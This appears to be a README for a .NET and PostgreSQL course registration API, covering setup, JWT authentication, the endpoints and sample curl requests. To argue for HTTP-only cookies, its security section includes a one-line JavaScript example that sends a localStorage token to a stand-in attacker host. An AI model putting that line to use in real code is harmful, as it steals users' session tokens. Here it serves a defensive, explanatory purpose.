# Course Registration System

A comprehensive backend API for managing course registrations, student enrollments, and instructor management with role-based access control.

## Table of Contents
- [Getting Started](#getting-started)
- [Technologies Used](#technologies-used)
- [Authentication & Security](#authentication--security)
- [API Endpoints](#api-endpoints)
- [Project Structure](#project-structure)

---

## Getting Started

### Prerequisites
- **.NET 10 SDK** - [Download here](https://dotnet.microsoft.com/download)
- **PostgreSQL 13+** - Database server
- **Git** - Version control

### Installation & Running

#### 1. Clone the Repository
```bash
git clone <repository-url>
cd WebAssignment
```

#### 2. Configure Database Connection
Edit `appsettings.Development.json`:
```json
{
  "ConnectionStrings": {
    "DefaultConnection": "Host=localhost;Port=5432;Database=course_registration;Username=postgres;Password=your_password"
  },
  "Jwt": {
    "Key": "your-very-long-secret-key-at-least-32-characters",
    "Issuer": "YourAppName",
    "Audience": "YourAppUsers",
    "ExpirationMinutes": 60
  }
}
```

#### 3. Install Dependencies
```bash
dotnet restore
```

#### 4. Run Database Migrations
```bash
dotnet ef database update
```

#### 5. Start the Application
```bash
dotnet run
```

The API will be available at `https://localhost:5001` (HTTPS) or `http://localhost:5000` (HTTP).

---

## Technologies Used

### Core Framework
- **ASP.NET Core 10** - Modern, high-performance web framework for building APIs and web applications. Provides built-in dependency injection, middleware pipeline, and scalability.

### Database
- **PostgreSQL 13+** - Robust, open-source relational database. Chosen for ACID compliance, JSON support, and production-grade reliability.
- **Entity Framework Core 10** - Object-relational mapper (ORM) for .NET. Simplifies database operations, provides type-safe queries, and supports migrations for version control.

### Authentication & Security
- **JWT (JSON Web Tokens)** - Stateless authentication mechanism. Each token is self-contained with encoded user claims, enabling scalable distributed systems.
- **JWT Bearer** - ASP.NET Core middleware that validates JWT tokens in request headers.
- **BCrypt.Net** - Industry-standard password hashing algorithm. Adds salt automatically and uses adaptive work factors to resist brute-force attacks.

### Supporting Libraries
- **System.IdentityModel.Tokens.Jwt** - IANA standard library for creating, reading, and validating JWT tokens.
- **Npgsql** - .NET data provider for PostgreSQL. Efficient, feature-complete driver for database connectivity.

---

## Authentication & Security

### Current Implementation: JWT (JSON Web Tokens)

The system currently uses **JWT Bearer tokens** for stateless authentication:

```
POST /api/auth/login
Response:
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "username": "john_student",
  "expiresAt": "2026-04-04T15:30:00Z"
}
```

**Advantages:**
- ✅ Stateless - No server-side session storage required
- ✅ Scalable - Works seamlessly with distributed systems/microservices
- ✅ Self-contained - All user info encoded in the token
- ✅ Mobile-friendly - Works across different platforms

---

### Industry Standard: HTTP-Only Cookies

While JWT is used here, **HTTP-only cookies are the industry standard** for authentication security. Here's why:

#### **Why HTTP-Only Cookies Are Superior for Security:**

1. **Protection Against XSS (Cross-Site Scripting)**
   - HTTP-only cookies cannot be accessed by JavaScript (`document.cookie` returns nothing)
   - Malicious scripts cannot steal authentication tokens
   - JWT stored in `localStorage` or cookies WITHOUT HTTP-only flag **ARE vulnerable**
   ```javascript
   // With HTTP-only cookie: SAFE ✅
   // Attacker's JS code cannot access it
   
   // With localStorage JWT: VULNERABLE ❌
   fetch('https://attacker.com?token=' + localStorage.getItem('token'))
   ```

2. **Automatic CSRF Protection**
   - Browser automatically sends HTTP-only cookies with same-origin requests
   - Server can validate SameSite flag to prevent CSRF attacks
   - No manual token extraction needed
   ```
   Request to https://yoursite.com/api/enrollments
   Browser automatically includes: Cookie: auth_token=...
   ```

3. **Transparent Token Refresh**
   - Cookies can be updated server-side without client-side logic
   - Implement refresh token rotation seamlessly
   - No localStorage management needed

4. **Clear Security Boundaries**
   - Only sent to specified domain/path
   - Cannot be read by JavaScript
   - Cannot be sent to third-party domains (with SameSite=Strict)

#### **HTTP-Only Cookie Best Practices:**

```javascript
// Server-side (Node.js/ASP.NET example)
response.setHeader('Set-Cookie', [
  `authToken=${token}; HttpOnly; Secure; SameSite=Strict; Max-Age=3600; Path=/api`
]);
```

| Property | Purpose | Value |
|----------|---------|-------|
| `HttpOnly` | Prevents JavaScript access | Always `true` |
| `Secure` | Only sent over HTTPS | Always `true` |
| `SameSite` | CSRF protection | `Strict` or `Lax` |
| `Max-Age` | Token expiration | 3600 seconds |

#### **Comparison: JWT vs HTTP-Only Cookies**

| Feature | JWT in localStorage | HTTP-Only Cookie |
|---------|-------------------|-----------------|
| XSS Vulnerability | 🔴 High | 🟢 Protected |
| CSRF Vulnerability | 🟡 Requires manual CSRF token | 🟢 Built-in (SameSite) |
| Stateless | 🟢 Yes | 🟢 Yes |
| Mobile/SPA | 🟢 Easy | 🟡 Requires framework support |
| Scalability | 🟢 Excellent | 🟢 Excellent |
| Complexity | 🟡 Manual token management | 🟢 Built-in browser handling |

**Recommendation:** For web applications, use **HTTP-only cookies** with refresh token pattern. For mobile apps or SPAs that can't use cookies, use **JWT stored securely** (not localStorage).

---

## API Endpoints

### Authentication
```
POST   /api/auth/register     - Register new user (public)
POST   /api/auth/login        - Login & receive JWT token (public)
```

### Courses
```
GET    /api/courses                            - List all courses (public)
GET    /api/courses/{id}                       - Get course details (public)
POST   /api/courses                            - Create course (Admin only)
PUT    /api/courses/{id}                       - Update course (Admin/Instructor)
DELETE /api/courses/{id}                       - Delete course (Admin only)
PUT    /api/courses/{courseId}/instructor/{id} - Assign instructor (Admin only)
```

### Students
```
GET    /api/students                      - List all students (Instructor/Admin)
GET    /api/students/{id}                 - Get student details (Student/Instructor/Admin)
POST   /api/students                      - Create student (Admin only)
PUT    /api/students/{id}                 - Update student profile (Student/Admin)
DELETE /api/students/{studentId}/withdraw/{courseId} - Withdraw from course (Student)
```

### Enrollments
```
POST   /api/enrollments                            - Enroll student (Admin only) ⚠️
GET    /api/enrollments/student/{studentId}       - Get student's courses (Authorized)
GET    /api/enrollments/course/{courseId}         - Get course roster (Instructor/Admin)
PUT    /api/enrollments/{studentId}/courses/{courseId} - Update grade (Instructor/Admin)
```

### Example Requests

**Register as Student:**
```bash
curl -X POST https://localhost:5001/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "alice_j",
    "email": "alice@university.edu",
    "password": "SecurePass123",
    "role": "Student"
  }'
```

**Login:**
```bash
curl -X POST https://localhost:5001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "alice_j",
    "password": "SecurePass123"
  }'
```

**Get Available Courses:**
```bash
curl https://localhost:5001/api/courses
```

**Enroll in Course (with JWT token):**
```bash
curl -X POST https://localhost:5001/api/enrollments \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJhbGc..." \
  -d '{
    "studentId": 1,
    "courseId": 2
  }'
```

**View My Enrolled Courses:**
```bash
curl https://localhost:5001/api/enrollments/student/1 \
  -H "Authorization: Bearer eyJhbGc..."
```

**Update Grade (Instructor only):**
```bash
curl -X PUT https://localhost:5001/api/enrollments/1/courses/2 \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJhbGc..." \
  -d '{ "grade": "A" }'
```

---

## Project Structure

```
WebAssignment/
├── Controllers/           # API endpoints
│   ├── AuthController.cs
│   ├── CourseController.cs
│   ├── StudentController.cs
│   ├── EnrollmentController.cs
│   ├── InstructorController.cs
│   └── HomeController.cs
├── Models/               # Database entities
│   ├── User.cs
│   ├── Student.cs
│   ├── Course.cs
│   ├── Enrollment.cs
│   ├── Instructor.cs
│   └── UserRole.cs
├── Services/            # Business logic
│   ├── AuthenticationService.cs
│   ├── CourseService.cs
│   ├── StudentService.cs
│   ├── EnrollmentService.cs
│   └── InstructorService.cs
├── Interfaces/          # Service contracts
│   ├── IAuthenticationService.cs
│   ├── ICourseService.cs
│   ├── IStudentService.cs
│   ├── IEnrollmentService.cs
│   └── IInstructorService.cs
├── DTOs/               # Data transfer objects
│   ├── CourseCreateDto.cs
│   ├── EnrollmentResponseDto.cs
│   ├── LoginDto.cs
│   ├── RegisterDto.cs
│   └── ... (other DTOs)
├── Database/           # Data access
│   └── ApplicationDbContext.cs
├── Migrations/         # EF Core migrations
├── Program.cs          # Application configuration
├── appsettings.json
└── WebAssignment.csproj
```

---


